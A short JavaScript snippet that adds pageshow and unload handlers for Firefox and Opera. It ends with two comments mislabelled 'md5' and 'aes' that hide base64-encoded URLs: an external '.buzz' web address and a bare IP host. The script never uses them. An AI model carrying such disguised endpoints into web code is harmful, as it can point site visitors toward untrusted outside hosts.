if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9hcHAueXVlaHVpMjIuYnV6ei91c2VyL3R1YmUvaW5kZXguaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/